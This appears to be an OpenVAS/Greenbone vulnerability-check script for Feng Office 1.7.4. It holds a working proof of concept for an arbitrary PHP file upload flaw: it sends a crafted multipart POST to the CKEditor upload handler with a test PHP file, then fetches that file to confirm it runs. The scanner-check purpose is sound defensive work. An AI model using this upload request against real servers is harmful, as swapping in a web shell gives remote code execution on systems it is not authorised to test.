# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:fengoffice:feng_office";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103133");
  script_version("2023-07-28T05:05:23+0000");
  script_tag(name:"last_modification", value:"2023-07-28 05:05:23 +0000 (Fri, 28 Jul 2023)");
  script_tag(name:"creation_date", value:"2011-03-28 19:09:51 +0200 (Mon, 28 Mar 2011)");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_name("Feng Office Arbitrary File Upload and Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_feng_office_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("FengOffice/installed");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47049");

  script_tag(name:"impact", value:"Attackers can exploit these issues to upload and execute arbitrary PHP
  shell code in the context of the webserver process, steal cookie-based
  authentication information, execute arbitrary client-side scripts in
  the context of the browser, and obtain sensitive information. Other
  attacks are also possible.");

  script_tag(name:"affected", value:"Feng Office 1.7.4 is vulnerable Other versions may also be affected.");

  script_tag(name:"summary", value:"Feng Office is prone to an arbitrary-file-upload vulnerability and
  multiple cross-site scripting vulnerabilities because the application
  fails to sufficiently sanitize user-supplied input.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
  disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to
  upgrade to a newer release, disable respective features, remove the product or replace the product by
  another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if( dir == "/" ) dir = "";

host = http_host_name( port:port );

rand = rand();
url = dir + "/public/assets/javascript/ckeditor/ck_upload_handler.php";
file = string( "VT_TEST_DELETE_ME_", rand, ".php" );
len = 175 + strlen( file );

req = string(
    "POST ", url, " HTTP/1.1\r\n",
    "Content-Type: multipart/form-data; boundary=----x\r\n",
    "Host: ", host, "\r\n",
    "Content-Length: ",len,"\r\n",
    "Accept: text/html\r\n",
    "Accept-Encoding: gzip,deflate,sdch\r\n" ,
    "Accept-Language: en-US,en;q=0.8\r\n",
    "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n",
    "------x\r\n",
    'Content-Disposition: form-data; name="imagefile"; filename="',file,'"',"\r\n",
    "Content-Type: application/octet-stream\r\n\r\n",
    "<?php echo '<pre>VT-Upload-Test</pre>'; ?>","\r\n",
    "------x--\r\n\r\n" );

recv = http_keepalive_send_recv( data:req, port:port, bodyonly:TRUE );

if( file >< recv ) {

  file_string = eregmatch( pattern:"/([0-9]+" + file + ")'", string:recv );
  if( isnull( file_string[1] ) ) exit( 0 );

  url2 = dir + '/tmp/' + file_string[1];
  req = http_get( item:url2, port:port );
  buf = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( "<pre>VT-Upload-Test</pre>" >< buf ) {
    report = http_report_vuln_url( port:port, url:url );
    report += '\n\n';
    report += "It was possible to upload the file " + http_report_vuln_url( port:port, url:url2, url_only:TRUE );
    report += '\n\nPlease delete this uploaded test file.';
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
